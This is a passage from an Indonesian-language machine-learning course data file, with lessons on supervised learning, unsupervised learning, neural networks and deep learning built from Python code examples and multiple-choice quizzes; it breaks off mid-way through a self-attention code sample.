        question: "Encoding yang tepat untuk variabel kategorikal kardinalitas tinggi?",
        options: ["One-Hot", "Target Encoding", "Ordinal", "Label"],
        answer: 1,
        explanation: "Target Encoding cocok untuk kardinalitas tinggi (mis. kode pos) tanpa ledakan dimensi."
      },
      {
        question: "Cara mencegah data leakage saat preprocessing?",
        options: ["Fit scaler pada seluruh data", "Fit scaler pada train only, transform test", "Skip scaling", "Transform sebelum split"],
        answer: 1,
        explanation: "Fit pada train only, transform pada test. Gunakan sklearn Pipeline."
      }
    ]
  },
  {
    level: 8,
    order: 4,
    title: "Supervised Learning",
    slug: "supervised-learning",
    description: "Regresi, klasifikasi, algoritma, dan evaluasi supervised learning.",
    icon: "📈",
    isProject: false,
    content: `# Supervised Learning

**Supervised learning** adalah cabang ML di mana model belajar dari data berlabel (pasangan input-output) untuk memprediksi output pada input baru. Dibagi menjadi dua tugas utama: **regresi** (output kontinu) dan **klasifikasi** (output diskrit). Materi ini mengupas algoritma inti, cara kerjanya, dan evaluasi yang tepat.

![Supervised Learning](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Regresi vs Klasifikasi

| Aspek | Regresi | Klasifikasi |
|-------|---------|-------------|
| Output | Kontinu (real number) | Diskrit (kelas) |
| Contoh | Harga rumah, suhu, demand | Spam/ham, churn yes/no |
| Loss umum | MSE, MAE, Huber | Cross-entropy, hinge |
| Metric | RMSE, MAE, R² | Accuracy, F1, AUC |
| Algoritma | Linear, Ridge, Lasso, RF | LogReg, SVM, RF, XGBoost |

## Algoritma Klasik

### Linear & Logistic Regression
Sederhana, interpretable, baseline kuat.

\`\`\`python
from sklearn.linear_model import LinearRegression, LogisticRegression, Ridge, Lasso

# Regresi linear
reg = LinearRegression()
reg.fit(X_train, y_train)
print(f"Coefficients: {dict(zip(X.columns, reg.coef_))}")
print(f"R² train: {reg.score(X_train, y_train):.3f}")

# Logistic regression (binary)
clf = LogisticRegression(penalty="l2", C=1.0, max_iter=1000)
clf.fit(X_train, y_train)
print(f"Predicted probabilities: {clf.predict_proba(X_test)[:5]}")

# Regularisasi: Ridge (L2), Lasso (L1)
ridge = Ridge(alpha=1.0)
lasso = Lasso(alpha=0.1)   # Lasso melakukan feature selection
\`\`\`

### Decision Tree & Random Forest
Decision tree mempartisi feature space; random forest adalah ensemble pohon-pohon.

\`\`\`python
from sklearn.tree import DecisionTreeClassifier, plot_tree
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier

# Single tree (interpretable, rentan overfit)
dt = DecisionTreeClassifier(max_depth=5, min_samples_leaf=20, random_state=42)
dt.fit(X_train, y_train)

# Random forest (robust, populer)
rf = RandomForestClassifier(n_estimators=200, max_depth=None,
                            min_samples_leaf=5, max_features="sqrt",
                            n_jobs=-1, random_state=42)
rf.fit(X_train, y_train)

# Feature importance
import pandas as pd
imp = pd.Series(rf.feature_importances_, index=X.columns).sort_values(ascending=False)
print(imp.head(10))

# Gradient boosting (sering menang kompetisi)
import xgboost as xgb
xgbclf = xgb.XGBClassifier(n_estimators=300, max_depth=6, learning_rate=0.05,
                           subsample=0.8, colsample_bytree=0.8,
                           eval_metric="logloss", random_state=42)
xgbclf.fit(X_train, y_train, eval_set=[(X_val, y_val)], early_stopping_rounds=20, verbose=False)
\`\`\`

### Support Vector Machine
Cari hyperplane dengan margin terbesar antar kelas.

\`\`\`python
from sklearn.svm import SVC
svm = SVC(kernel="rbf", C=1.0, gamma="scale", probability=True)
svm.fit(X_train_scaled, y_train)
\`\`\`

### k-Nearest Neighbors
Prediksi berdasarkan mayoritas tetangga terdekat.

\`\`\`python
from sklearn.neighbors import KNeighborsClassifier
knn = KNeighborsClassifier(n_neighbors=5, weights="distance", n_jobs=-1)
knn.fit(X_train_scaled, y_train)
\`\`\`

## Algoritma untuk Klasifikasi Multi-class

- **One-vs-Rest**: satu classifier per kelas (default sklearn).
- **Softmax Regression**: generalisasi logistic untuk multi-class.
- **Native multi-class**: RF, Naive Bayes, neural network.

## Metric Evaluasi

### Klasifikasi
\`\`\`python
from sklearn.metrics import (accuracy_score, precision_score, recall_score,
                             f1_score, roc_auc_score, confusion_matrix,
                             classification_report, roc_curve)

y_pred = clf.predict(X_test)
y_prob = clf.predict_proba(X_test)[:, 1]

print(f"Accuracy:  {accuracy_score(y_test, y_pred):.3f}")
print(f"Precision: {precision_score(y_test, y_pred):.3f}")
print(f"Recall:    {recall_score(y_test, y_pred):.3f}")
print(f"F1:        {f1_score(y_test, y_pred):.3f}")
print(f"AUC-ROC:   {roc_auc_score(y_test, y_prob):.3f}")

print(confusion_matrix(y_test, y_pred))
print(classification_report(y_test, y_pred))
\`\`\`

\`\`\`text
Confusion Matrix:
              Pred Neg   Pred Pos
Actual Neg      TN          FP
Actual Pos      FN          TP

Precision = TP / (TP + FP)   → dari yang diprediksi positif, berapa benar
Recall    = TP / (TP + FN)   → dari yang aktual positif, berapa tertangkap
F1        = 2*P*R / (P+R)    → harmonic mean

Pilih metric sesuai bisnis:
- Fraud detection → recall tinggi (jangan lewatkan fraud)
- Spam filter → precision tinggi (jangan blok email sah)
\`\`\`

### Regresi
\`\`\`python
from sklearn.metrics import mean_squared_error, mean_absolute_error, r2_score
import numpy as np

y_pred = reg.predict(X_test)
print(f"RMSE: {np.sqrt(mean_squared_error(y_test, y_pred)):.3f}")
print(f"MAE:  {mean_absolute_error(y_test, y_pred):.3f}")
print(f"R²:   {r2_score(y_test, y_pred):.3f}")

# MAPE (mean absolute percentage error)
mape = np.mean(np.abs((y_test - y_pred) / y_test)) * 100
print(f"MAPE: {mape:.1f}%")
\`\`\`

## Cross-Validation

\`\`\`python
from sklearn.model_selection import cross_val_score, StratifiedKFold, GridSearchCV

# K-fold cross-validation
cv = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)
scores = cross_val_score(rf, X, y, cv=cv, scoring="f1", n_jobs=-1)
print(f"CV F1: {scores.mean():.3f} ± {scores.std():.3f}")

# Hyperparameter tuning
param_grid = {
    "n_estimators": [100, 200, 500],
    "max_depth": [None, 10, 20],
    "min_samples_leaf": [1, 5, 10],
}
grid = GridSearchCV(rf, param_grid, cv=cv, scoring="f1", n_jobs=-1, verbose=1)
grid.fit(X_train, y_train)
print(f"Best: {grid.best_params_} → {grid.best_score_:.3f}")
\`\`\`

## Class Imbalance

\`\`\`python
# Class weight
from sklearn.utils.class_weight import compute_class_weight
cw = compute_class_weight("balanced", classes=np.unique(y), y=y)
weights = dict(zip(np.unique(y), cw))
clf = RandomForestClassifier(class_weight=weights)

# Atau threshold tuning untuk F1
from sklearn.metrics import precision_recall_curve
prec, rec, thr = precision_recall_curve(y_val, y_prob)
f1 = 2 * prec * rec / (prec + rec + 1e-9)
best_thr = thr[f1.argmax()]
y_pred = (y_prob > best_thr).astype(int)
\`\`\`

## Bias-Variance di Praktik

\`\`\`text
Diagnosis via learning curve:

Training score tinggi, Val score rendah  → overfitting (high variance)
Training & Val score sama-sama rendah     → underfitting (high bias)

Solusi overfitting:
- Lebih banyak data
- Regularisasi (L1/L2, dropout, max_depth)
- Feature selection
- Ensemble (bagging)

Solusi underfitting:
- Model lebih kompleks
- Feature engineering
- Kurangi regularisasi
\`\`\`

## Interpretabilitas

\`\`\`python
import shap
explainer = shap.TreeExplainer(rf)
shap_values = explainer.shap_values(X_test)
shap.summary_plot(shap_values, X_test)

# LIME untuk lokal
from lime.lime_tabular import LimeTabularExplainer
lime = LimeTabularExplainer(X_train.values, feature_names=X.columns, class_names=["no", "yes"])
exp = lime.explain_instance(X_test.iloc[0].values, clf.predict_proba, num_features=5)
\`\`\`

## Tips & Best Practices

- Mulai dari **baseline sederhana** (logistic regression) sebelum kompleks.
- **Selalu cross-validation** untuk estimasi generalisasi.
- **Pilih metric sesuai konteks bisnis** (bukan accuracy untuk imbalance).
- **Tune hyperparameter** setelah feature engineering, bukan sebaliknya.
- **Ensemble** (XGBoost, LightGBM, CatBoost) sering jadi pemenang tabular.
- **Hindari leakage**: timing split, group split, fit train only.
- Dokumentasikan asumsi dan trade-off (model card).

## Kesimpulan

Supervised learning adalah pondasi ML praktis. Dengan memahami trade-off bias-variance, algoritma klasik (linear, tree, ensemble), dan metric yang sesuai konteks bisnis, Anda dapat membangun model yang tidak hanya akurat di paper, tetapi memberi nilai nyata. Yang membedakan praktisi hebat adalah **kemampuan memilih algoritma sesuai data & masalah, serta mengukur dengan metric yang relevan bisnis**. Selanjutnya: unsupervised learning untuk data tanpa label.`,
    quiz: [
      {
        question: "Algoritma yang mempartisi feature space berbasis aturan if-else?",
        options: ["Logistic Regression", "Decision Tree", "k-Means", "PCA"],
        answer: 1,
        explanation: "Decision tree mempartisi feature space dengan aturan if-else, interpretable."
      },
      {
        question: "Metric terbaik untuk dataset klasifikasi tidak seimbang?",
        options: ["Accuracy", "F1-score", "Mean squared error", "R²"],
        answer: 1,
        explanation: "F1 menggabungkan precision-recall, lebih informatif dari accuracy saat imbalance."
      },
      {
        question: "Tanda model overfitting pada learning curve?",
        options: ["Train rendah, val rendah", "Train tinggi, val rendah", "Train & val sama tinggi", "Val naik terus"],
        answer: 1,
        explanation: "Train tinggi + val rendah = model hafal training, gagal generalisasi."
      }
    ]
  },
  {
    level: 8,
    order: 5,
    title: "Unsupervised Learning",
    slug: "unsupervised-learning",
    description: "Clustering, dimensionality reduction, dan anomaly detection.",
    icon: "🔍",
    isProject: false,
    content: `# Unsupervised Learning

**Unsupervised learning** menemukan struktur tersembunyi dalam data tanpa label. Tiga tugas utama: **clustering** (kelompok), **dimensionality reduction** (kompresi), dan **anomaly detection** (outlier). Unsupervised berguna saat labeling mahal atau untuk eksplorasi—sering jadi langkah awal sebelum supervised.

![Unsupervised Learning](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Clustering

### k-Means
Partisi data ke K cluster berdasarkan jarak ke centroid. Cepat, scaling baik, tetapi perlu K ditentukan.

\`\`\`python
from sklearn.cluster import KMeans
from sklearn.metrics import silhouette_score
import numpy as np

# Scaling wajib sebelum clustering
from sklearn.preprocessing import StandardScaler
X_scaled = StandardScaler().fit_transform(X)

# Elbow method untuk pilih K
inertias = []
for k in range(2, 11):
    km = KMeans(n_clusters=k, init="k-means++", n_init=10, random_state=42)
    km.fit(X_scaled)
    inertias.append(km.inertia_)

# Silhouette score (lebih informatif)
silhouettes = []
for k in range(2, 11):
    km = KMeans(n_clusters=k, n_init=10, random_state=42)
    labels = km.fit_predict(X_scaled)
    silhouettes.append(silhouette_score(X_scaled, labels))

best_k = np.argmax(silhouettes) + 2  # range mulai 2
km = KMeans(n_clusters=best_k, n_init=10, random_state=42)
clusters = km.fit_predict(X_scaled)
\`\`\`

### DBSCAN
Density-based—tidak perlu K, menemukan cluster bentuk arbitrary, mendeteksi noise.

\`\`\`python
from sklearn.cluster import DBSCAN
dbscan = DBSCAN(eps=0.5, min_samples=5, n_jobs=-1)
clusters = dbscan.fit_predict(X_scaled)
# Cluster -1 = noise/outlier
n_clusters = len(set(clusters)) - (1 if -1 in clusters else 0)
print(f"DBSCAN found {n_clusters} clusters")
\`\`\`

### Hierarchical Clustering
Membangun dendrogram—tidak perlu K awal, bisa cut tree di berbagai level.

\`\`\`python
from sklearn.cluster import AgglomerativeClustering
from scipy.cluster.hierarchy import dendrogram, linkage
import matplotlib.pyplot as plt

Z = linkage(X_scaled[:200], method="ward")
plt.figure(figsize=(12, 6))
dendrogram(Z, truncate_mode="level", p=5)
plt.title("Hierarchical Clustering Dendrogram")

agg = AgglomerativeClustering(n_clusters=4, linkage="ward")
clusters = agg.fit_predict(X_scaled)
\`\`\`

### Gaussian Mixture Model (GMM)
Soft clustering—setiap titik punya probabilitas ke setiap cluster.

\`\`\`python
from sklearn.mixture import GaussianMixture
gmm = GaussianMixture(n_components=4, covariance_type="full", random_state=42)
gmm.fit(X_scaled)
clusters = gmm.predict(X_scaled)
probs = gmm.predict_proba(X_scaled)  # soft assignment
\`\`\`

## Dimensionality Reduction

### PCA (Principal Component Analysis)
Linier—cari arah variansi maksimum.

\`\`\`python
from sklearn.decomposition import PCA
import matplotlib.pyplot as plt

pca = PCA(n_components=0.95, random_state=42)   # retain 95% variance
X_pca = pca.fit_transform(X_scaled)
print(f"Reduced: {X.shape} → {X_pca.shape}")
print(f"Explained variance ratio: {pca.explained_variance_ratio_}")

# Scree plot
plt.plot(np.cumsum(pca.explained_variance_ratio_), marker="o")
plt.xlabel("Number of components"); plt.ylabel("Cumulative variance")

# Visualisasi 2D
plt.figure(figsize=(8, 6))
plt.scatter(X_pca[:, 0], X_pca[:, 1], c=clusters, cmap="viridis", alpha=0.6)
\`\`\`

### t-SNE & UMAP
Non-linear untuk visualisasi—pertahankan struktur lokal.

\`\`\`python
from sklearn.manifold import TSNE
import umap  # pip install umap-learn

# t-SNE (lambat untuk data besar)
tsne = TSNE(n_components=2, perplexity=30, random_state=42, init="pca")
X_tsne = tsne.fit_transform(X_scaled[:5000])   # sample untuk kecepatan

# UMAP (lebih cepat & preserve struktur global)
reducer = umap.UMAP(n_components=2, n_neighbors=15, min_dist=0.1, random_state=42)
X_umap = reducer.fit_transform(X_scaled)
\`\`\`

## Anomaly Detection

\`\`\`python
from sklearn.ensemble import IsolationForest
from sklearn.svm import OneClassSVM
from sklearn.neighbors import LocalOutlierFactor

# Isolation Forest (populer, cepat, scaling baik)
iso = IsolationForest(n_estimators=100, contamination=0.05, random_state=42, n_jobs=-1)
outlier_pred = iso.fit_predict(X_scaled)  # -1 = outlier, 1 = normal
scores = iso.decision_function(X_scaled)  # lower = more anomalous

# Local Outlier Factor (density-based)
lof = LocalOutlierFactor(n_neighbors=20, contamination=0.05)
outlier_pred = lof.fit_predict(X_scaled)

# One-Class SVM (untuk data kecil)
ocsvm = OneClassSVM(kernel="rbf", nu=0.05, gamma="scale")
outlier_pred = ocsvm.fit_predict(X_scaled)
\`\`\`

## Association Rules & Market Basket

\`\`\`python
from mlxtend.frequent_patterns import apriori, association_rules
import pandas as pd

# Data: one-hot basket per transaksi
basket = (df.groupby(["transaction", "product"])["qty"]
            .sum().unstack().fillna(0).gt(0).astype(int))

frequent = apriori(basket, min_support=0.02, use_colnames=True)
rules = association_rules(frequent, metric="lift", min_threshold=1.5)
rules = rules.sort_values("lift", ascending=False).head(10)
print(rules[["antecedents", "consequents", "support", "confidence", "lift"]])
\`\`\`

## Evaluasi Clustering

\`\`\`python
from sklearn.metrics import (silhouette_score, davies_bouldin_score,
                             calinski_harabasz_score, adjusted_rand_score)

# Internal metric (tanpa ground truth)
sil = silhouette_score(X_scaled, clusters)         # [-1, 1], higher better
db = davies_bouldin_score(X_scaled, clusters)      # lower better
ch = calinski_harabasz_score(X_scaled, clusters)   # higher better

# External (dengan ground truth, mis. untuk validasi)
ari = adjusted_rand_score(y_true, clusters)        # [-1, 1], 1 = perfect
\`\`\`

## Use Cases Unsupervised

- **Customer segmentation**: RFM (Recency, Frequency, Monetary) + k-Means.
- **Anomaly detection**: fraud, sensor failure, network intrusion.
- **Recommender**: collaborative filtering via matrix factorization.
- **Topic modeling**: LDA, BERTopic untuk dokumen.
- **Image compression**: PCA/UMAP untuk fitur.
- **Preprocessing**: reduce dimensi sebelum supervised.

\`\`\`python
# RFM Analysis untuk customer segmentation
import numpy as np
import datetime as dt

snapshot = df["order_date"].max() + dt.timedelta(days=1)
rfm = df.groupby("customer_id").agg({
    "order_date": lambda d: (snapshot - d.max()).days,   # Recency
    "order_id": "count",                                  # Frequency
    "amount": "sum"                                       # Monetary
}).rename(columns={"order_date": "recency", "order_id": "frequency"})

# Log transform + scale
rfm_log = np.log1p(rfm)
rfm_scaled = StandardScaler().fit_transform(rfm_log)

# Cluster
km = KMeans(n_clusters=4, n_init=10, random_state=42)
rfm["segment"] = km.fit_predict(rfm_scaled)
print(rfm.groupby("segment").mean())
\`\`\`

## Tips & Best Practices

- **Scaling wajib** untuk clustering & PCA (jarak-based).
- Visualisasi 2D (PCA, t-SNE, UMAP) untuk intuisi, bukan klaim formal.
- **Jangan lakukan supervised langsung**—selalu EDA + clustering dulu.
- Untuk data besar, gunakan **MiniBatchKMeans** atau **HDBSCAN**.
- **Anomaly detection** threshold tuning via business trade-off (FP vs FN cost).
- Cluster **interpretability**: profil centroid, beri label bisnis (mis. "high-value churner").

## Kesimpulan

Unsupervised learning membuka wawasan dari data tanpa label. Clustering mengungkap segmen, dimensionality reduction memvisualisasikan & mengompresi, anomaly detection menemukan pencilan. Tantangannya: tidak ada "ground truth" untuk validasi, sehingga evaluasi membutuhkan metrik internal + judgment bisnis. Kombinasi unsupervised + supervised sering menghasilkan pipeline yang lebih kuat dari supervised saja.`,
    quiz: [
      {
        question: "Algoritma clustering yang TIDAK perlu menentukan jumlah cluster awal?",
        options: ["k-Means", "DBSCAN", "GMM", "K-Means++"],
        answer: 1,
        explanation: "DBSCAN berbasis density, menemukan cluster otomatis dan mendeteksi noise."
      },
      {
        question: "Metrik internal untuk mengevaluasi clustering (higher = better)?",
        options: ["Davies-Bouldin", "Inertia", "Silhouette score", "Within-cluster SSE"],
        answer: 2,
        explanation: "Silhouette score [-1,1], higher = cluster lebih terpisah & kohesif."
      },
      {
        question: "Teknik dimensionality reduction non-linear untuk visualisasi?",
        options: ["PCA", "t-SNE", "LDA (supervised)", "SVD"],
        answer: 1,
        explanation: "t-SNE (dan UMAP) non-linear, ideal untuk visualisasi struktur lokal."
      }
    ]
  },
  {
    level: 8,
    order: 6,
    title: "Neural Networks",
    slug: "neural-networks",
    description: "Perceptron, activation function, backpropagation, dan training NN.",
    icon: "🧠",
    isProject: false,
    content: `# Neural Networks

**Neural network** adalah model inspirasi biologis yang terdiri dari neuron buatan tersusun dalam lapisan. Setiap neuron menghitung kombinasi linear input + aktivasi non-linear. Dengan lapisan tersembunyi, NN dapat mempelajari fungsi non-linear kompleks—fondasi deep learning. Materi ini mengupas matematika dan implementasi neural network sederhana.

![Neural Networks](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Anatomi Neuron

Setiap neuron menghitung:

\`\`\`text
z = w₁x₁ + w₂x₂ + ... + wₙxₙ + b     (linear combination)
a = f(z)                              (activation function)

- x = input feature
- w = weight (parameter yang dipelajari)
- b = bias
- f = fungsi aktivasi non-linear
\`\`\`

Tanpa aktivasi non-linear, berapapun lapisan tetap ekuivalen dengan satu transformasi linear.

## Fungsi Aktivasi

| Nama | Rumus | Kapan pakai |
|------|-------|-------------|
| **ReLU** | max(0, z) | Default hidden layer |
| **Leaky ReLU** | max(0.01z, z) | Jika ReLU dying |
| **Sigmoid** | 1/(1+e^-z) | Output binary |
| **Tanh** | (e^z - e^-z)/(e^z + e^-z) | Hidden, range [-1,1] |
| **Softmax** | e^zᵢ / Σe^zⱼ | Output multi-class |
| **GELU** | z·Φ(z) | Transformer, modern |

\`\`\`python
import numpy as np
import matplotlib.pyplot as plt

z = np.linspace(-5, 5, 200)
plt.figure(figsize=(10, 6))
plt.plot(z, np.maximum(0, z), label="ReLU", linewidth=2)
plt.plot(z, 1/(1+np.exp(-z)), label="Sigmoid")
plt.plot(z, np.tanh(z), label="Tanh")
plt.plot(z, np.where(z > 0, z, 0.01*z), label="Leaky ReLU", linestyle="--")
plt.legend(); plt.grid(True); plt.title("Activation Functions")
\`\`\`

## Arsitektur Multi-Layer Perceptron (MLP)

\`\`\`text
Input Layer  →  Hidden Layer(s)  →  Output Layer
(x₁,x₂,...,xₙ)   (h₁,...,hₘ)        (ŷ)

Forward pass:
  a⁰ = x                           (input)
  zˡ = Wˡ · a^(l-1) + bˡ          (pre-activation layer l)
  aˡ = f(zˡ)                      (activation layer l)
  ŷ = aᴸ                          (output layer L)
\`\`\`

## Backpropagation & Gradient Descent

Loss function mengukur kesalahan prediksi. Backpropagation menghitung gradien loss terhadap setiap parameter menggunakan chain rule.

\`\`\`text
Loss:    L(y, ŷ)
Gradien: ∂L/∂Wˡ, ∂L/∂bˡ via chain rule

Update:
  W ← W - η · ∂L/∂W     (η = learning rate)
  b ← b - η · ∂L/∂b

Variants:
- SGD          : vanilla
- Momentum     : akumulasi gradien (mempercepat konvergensi)
- Adam         : adaptif lr per parameter (paling populer)
- RMSprop      : adaptif, populer untuk RNN
\`\`\`

## Implementasi dari Nol (NumPy)

\`\`\`python
import numpy as np

class MLP:
    def __init__(self, in_dim, hid_dim, out_dim, lr=0.01, seed=42):
        rng = np.random.default_rng(seed)
        self.W1 = rng.standard_normal((in_dim, hid_dim)) * np.sqrt(2/in_dim)
        self.b1 = np.zeros(hid_dim)
        self.W2 = rng.standard_normal((hid_dim, out_dim)) * np.sqrt(2/hid_dim)
        self.b2 = np.zeros(out_dim)
        self.lr = lr

    def relu(self, z): return np.maximum(0, z)
    def softmax(self, z):
        e = np.exp(z - z.max(axis=1, keepdims=True))
        return e / e.sum(axis=1, keepdims=True)

    def forward(self, X):
        self.z1 = X @ self.W1 + self.b1
        self.a1 = self.relu(self.z1)
        self.z2 = self.a1 @ self.W2 + self.b2
        return self.softmax(self.z2)

    def backward(self, X, y, probs):
        m = X.shape[0]
        dz2 = (probs - y) / m                  # cross-entropy + softmax gradient
        self.dW2 = self.a1.T @ dz2
        self.db2 = dz2.sum(axis=0)
        da1 = dz2 @ self.W2.T
        dz1 = da1 * (self.z1 > 0)              # ReLU gradient
        self.dW1 = X.T @ dz1
        self.db1 = dz1.sum(axis=0)

    def step(self):
        self.W1 -= self.lr * self.dW1
        self.b1 -= self.lr * self.db1
        self.W2 -= self.lr * self.dW2
        self.b2 -= self.lr * self.db2

# Train loop
nn = MLP(in_dim=784, hid_dim=128, out_dim=10, lr=0.1)
for epoch in range(20):
    probs = nn.forward(X_batch)
    nn.backward(X_batch, y_onehot, probs)
    nn.step()
\`\`\`

## Implementasi dengan PyTorch

\`\`\`python
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import DataLoader, TensorDataset

# Dataset
loader = DataLoader(TensorDataset(torch.FloatTensor(X_train), torch.LongTensor(y_train)),
                    batch_size=64, shuffle=True)

# Model
class MLP(nn.Module):
    def __init__(self, in_dim, hid_dim, out_dim):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(in_dim, hid_dim),
            nn.BatchNorm1d(hid_dim),
            nn.ReLU(),
            nn.Dropout(0.2),
            nn.Linear(hid_dim, hid_dim),
            nn.BatchNorm1d(hid_dim),
            nn.ReLU(),
            nn.Dropout(0.2),
            nn.Linear(hid_dim, out_dim),
        )
    def forward(self, x): return self.net(x)

device = "cuda" if torch.cuda.is_available() else "cpu"
model = MLP(784, 256, 10).to(device)
criterion = nn.CrossEntropyLoss()
optimizer = optim.Adam(model.parameters(), lr=1e-3, weight_decay=1e-5)
scheduler = optim.lr_scheduler.ReduceLROnPlateau(optimizer, patience=3, factor=0.5)

# Training loop
for epoch in range(50):
    model.train()
    total_loss = 0
    for xb, yb in loader:
        xb, yb = xb.to(device), yb.to(device)
        optimizer.zero_grad()
        out = model(xb)
        loss = criterion(out, yb)
        loss.backward()
        optimizer.step()
        total_loss += loss.item() * len(xb)
    scheduler.step(total_loss / len(loader))
    print(f"Epoch {epoch+1}: loss={total_loss/len(loader):.4f}")
\`\`\`

## Loss Function Umum

| Tugas | Loss | PyTorch |
|-------|------|---------|
| Regresi | MSE | \`nn.MSELoss()\` |
| Klasifikasi binary | BCE | \`nn.BCEWithLogitsLoss()\` |
| Klasifikasi multi-class | Cross-entropy | \`nn.CrossEntropyLoss()\` |
| L1 / Huber | L1, Smooth L1 | \`nn.L1Loss()\`, \`nn.SmoothL1Loss()\` |

## Regularisasi

Mencegah overfitting:

- **L2 (weight decay)** — tambah ‖w‖² ke loss.
- **Dropout** — matikan neuron acak saat training (rate 0.1-0.5).
- **Batch Normalization** — normalisasi aktivasi per batch.
- **Layer Norm** — normalisasi per sample (transformer).
- **Early Stopping** — hentikan saat val loss naik.
- **Data Augmentation** — augmentasi data training (image: flip, rotasi, crop).

## Inisialisasi Weight

- **Xavier/Glorot** — untuk tanh/sigmoid: \`std = sqrt(2/(fan_in+fan_out))\`.
- **He/Kaiming** — untuk ReLU: \`std = sqrt(2/fan_in)\` (default PyTorch Linear).
- Hindari inisialisasi nol (simetri tidak pecah) atau konstan besar (gradien meledak/hilang).

## Tips & Best Practices

- Mulai dengan **architectur sederhana** (1-2 hidden layer) sebelum tambah kompleksitas.
- **Scale input** (StandardScaler) — neural network sensitif terhadap skala.
- **Monitor training vs validation loss** untuk deteksi overfit/underfit.
- **Learning rate scheduler** (ReduceLROnPlateau, CosineAnnealing) membantu konvergensi.
- **Mixed precision** (fp16) untuk training lebih cepat di GPU modern.
- **Reproducibility**: set seed, \`torch.use_deterministic_algorithms(True)\`.
- **Track eksperimen** dengan MLflow/W&B untuk eksperimen terkontrol.

## Kesimpulan

Neural network memodelkan fungsi kompleks melalui kombinasi linear + aktivasi non-linear. Memahami forward pass, backpropagation, dan elemen regularisasi (dropout, batchnorm, weight decay) adalah keterampilan fondasi sebelum melangkah ke arsitektur khusus (CNN, RNN, Transformer). Implementasi dari nol sekali mengajarkan intuisi; setelahnya, pakai framework (PyTorch/TensorFlow) untuk produktivitas. Yang membedakan praktisi hebat adalah **kemampuan diagnosis training** (loss curve, gradient flow) bukan sekadar memanggil API.`,
    quiz: [
      {
        question: "Mengapa neural network butuh fungsi aktivasi non-linear?",
        options: ["Mempercepat training", "Agar bisa belajar fungsi non-linear", "Mengurangi parameter", "Menghindari overfitting"],
        answer: 1,
        explanation: "Tanpa non-linear, stack lapisan linear tetap ekuivalen linear—tak bisa model non-linear."
      },
      {
        question: "Fungsi aktivasi default untuk hidden layer modern?",
        options: ["Sigmoid", "Tanh", "ReLU", "Softmax"],
        answer: 2,
        explanation: "ReLU (max(0,z)) adalah default hidden layer—cepat, tidak saturate positif."
      },
      {
        question: "Algoritma optimisasi paling populer untuk training NN?",
        options: ["SGD murni", "Adam", "Newton method", "Coordinate descent"],
        answer: 1,
        explanation: "Adam adaptif per-parameter, populer untuk mayoritas workload deep learning."
      }
    ]
  },
  {
    level: 8,
    order: 7,
    title: "Deep Learning",
    slug: "deep-learning",
    description: "CNN, RNN, Transformer, dan framework deep learning modern.",
    icon: "⚡",
    isProject: false,
    content: `# Deep Learning

**Deep learning** adalah sub-bidang ML berbasis neural network dengan banyak lapisan. Berkat GPU, dataset besar, dan arsitektur khusus (CNN, RNN, Transformer), deep learning mencapai performa super-human pada banyak tugas: image classification, speech recognition, terjemahan, hingga protein folding. Materi ini mengupas arsitektur utama dan framework modern.

![Deep Learning](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## CNN (Convolutional Neural Network)

Spesialisasi untuk data grid (gambar, audio spectrogram). Tiga konsep inti:

- **Convolution** — filter belajar pola lokal (edge, tekstur, objek).
- **Pooling** — downsampling, invarian translasi.
- **Hierarchical features** — lapisan awal belajar edge, lapisan dalam belajar objek.

\`\`\`python
import torch
import torch.nn as nn

class CNN(nn.Module):
    def __init__(self, num_classes=10):
        super().__init__()
        self.features = nn.Sequential(
            nn.Conv2d(3, 32, kernel_size=3, padding=1),
            nn.BatchNorm2d(32), nn.ReLU(),
            nn.Conv2d(32, 32, 3, padding=1), nn.ReLU(),
            nn.MaxPool2d(2),                       # 32x32 → 16x16

            nn.Conv2d(32, 64, 3, padding=1),
            nn.BatchNorm2d(64), nn.ReLU(),
            nn.Conv2d(64, 64, 3, padding=1), nn.ReLU(),
            nn.MaxPool2d(2),                       # 16x16 → 8x8
        )
        self.classifier = nn.Sequential(
            nn.AdaptiveAvgPool2d(1),
            nn.Flatten(),
            nn.Dropout(0.5),
            nn.Linear(64, num_classes),
        )
    def forward(self, x):
        return self.classifier(self.features(x))

# Transfer learning dengan ResNet pre-trained
from torchvision import models
model = models.resnet50(weights=models.ResNet50_Weights.IMAGENET1K_V2)
model.fc = nn.Linear(model.fc.in_features, num_classes)  # replace head
for p in model.parameters(): p.requires_grad = False     # freeze backbone
for p in model.fc.parameters(): p.requires_grad = True   # train head only
\`\`\`

## RNN & LSTM untuk Sequence

RNN memproses sequence dengan hidden state yang beruntun. LSTM/GRU mengatasi vanishing gradient.

\`\`\`python
class TextClassifier(nn.Module):
    def __init__(self, vocab_size, emb_dim=128, hid_dim=256, num_classes=5):
        super().__init__()
        self.emb = nn.Embedding(vocab_size, emb_dim, padding_idx=0)
        self.lstm = nn.LSTM(emb_dim, hid_dim, batch_first=True,
                            bidirectional=True, num_layers=2, dropout=0.3)
        self.fc = nn.Linear(hid_dim * 2, num_classes)   # *2 for bidirectional

    def forward(self, x):
        emb = self.emb(x)                  # (B, T, E)
        out, (h, c) = self.lstm(emb)       # (B, T, 2H), (2, B, H)
        h = torch.cat([h[-2], h[-1]], dim=1)   # last hidden both directions
        return self.fc(h)
\`\`\`

## Transformer & Attention

Transformer (Vaswani et al. 2017) mengganti rekurens dengan **self-attention**—paralel, scaling baik. Fondasi LLM modern (GPT, BERT, Llama).

\`\`\`text
Self-Attention:
  Q = X · W_Q    (query)
  K = X · W_K    (key)
  V = X · W_V    (value)
  Attention(Q,K,V) = softmax(Q·K^T / sqrt(d_k)) · V

Multi-head: jalankan beberapa attention paralel, concat, proyeksi.
Positional encoding: tambahkan info posisi (sinusoidal atau learned).
\`\`\`

\`\`\`python
import torch.nn.functional as F

class SelfAttention(nn.Module):
    def __init__(self, dim, heads=8):
        super().__init__()
        self.heads = heads
        self.scale = (dim // heads) ** -0.5
        self.to_qkv = nn.Linear(dim, dim * 3, bias=False)
        self.to_out = nn.Linear(dim, dim)

    def forward(self, x, mask=None):
        B, T, D = x.shape
        qkv = self.to_qkv(x).chunk(3, dim=-1)
        q, k, v = map(lambda t: t.reshape(B, T, self.heads, D//self.heads).transpose(1,2), qkv)
